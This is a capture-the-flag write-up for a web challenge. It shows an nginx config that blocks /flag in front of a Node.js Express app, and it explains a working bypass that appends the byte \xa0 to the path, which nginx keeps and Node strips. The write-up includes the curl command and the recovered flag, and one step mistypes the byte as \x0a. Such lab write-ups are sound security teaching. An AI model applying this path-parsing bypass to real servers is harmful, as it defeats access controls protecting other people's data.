# Engine Ex

**Difficulty:** Easy
**Category:** Web
**Source Code:** Available
**Author:** 0utc4s7
**Description:** Are you familiar with the Trojan Horse story ?

## Source Code

- nginx configuration :

```
events {}

http {
    server {
        listen 80;
        server_name your_domain.com;

        location / {
            proxy_pass http://nodejs_app:3000;
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection 'upgrade';
            proxy_set_header Host $host;
            proxy_cache_bypass $http_upgrade;
        }

        location = /flag {
            deny all;
        }

        location = /flag/ {
            deny all;
        }
    }
}
```

- app.js :

```javascript
const express = require('express');

const app = express();

app.get('/', (req, res) => {
    res.send(`
        <br><br><br><br><br><br>
        <h1 style='text-align:center;'>Welcome!</h1>
        <p style='text-align:center;'>The flag is hidden somewhere... Can you find it?</p>
    `);
});

app.get('/flag', (req, res) => {
    res.send(`
        <br><br><br><br><br><br>
        <h1 style='text-align:center;'>Here You Go :</h1>
        <br>
        <p style='text-align:center;'>nexus{F4k3_Fl4g}</p>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
```

## Solution

we have two routes in the nodejs app, the first is `/` which give us a regular page with nothing on it, and the `/flag` rout which contains a pge that contains the content of the flag, but requesting that route will result in a `403 Forbidden` response :

```bash
└─$ curl 127.0.0.1/flag
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.22.0</center>
</body>
</html>
```

the reason is that our request is going first through nginx which acts as a proxy in this case, and we see in the nginx configuration that the `/flag` path is denied :

```plaintext
        location = /flag {
            deny all;
        }

        location = /flag/ {
            deny all;
        }
```

which means we can't request the flag, unless, we find a way to bypass it.

we know from the dockerfile that the version of nginx is `1.22.0`, this version, among others, is vulnerable to `Unsafe path restriction`, which means nginx will treat `/flag` and `/flag (any appended)` character as different paths.

combining that with the fact that Node.js ignores the character `\xa0` from the pathname, but Nginx considers them as part of the URL, we can abuse this to request the `/flag` route.

the exploit goes like this :

- First we make a request to this endpoint `/flag\xa0`.

- Then Nginx receives the HTTP request and performs path normalization on the pathname.

- As Nginx includes the character `\xa0` as part of the pathname, the ACL rule for the `/flag` URI will not be triggered. Consequently, Nginx will forward the HTTP message to the backend.

- When the URI `/flag\x0a` is received by the Node.js server, the character `\xa0` will be removed, allowing successful retrieval of the `/flag` endpoint.

let's try it out :

```bash
└─$ curl $'http://127.0.0.1/flag\xa0' -s | html2markdown

# Here You Go :

nexus{Pr0x1y1ng_C4n_B3_D4ng3r0uS$ssss}
```

and the request was made successfully and we got the flag!

# Flag

`nexus{Pr0x1y1ng_C4n_B3_D4ng3r0uS$ssss}`
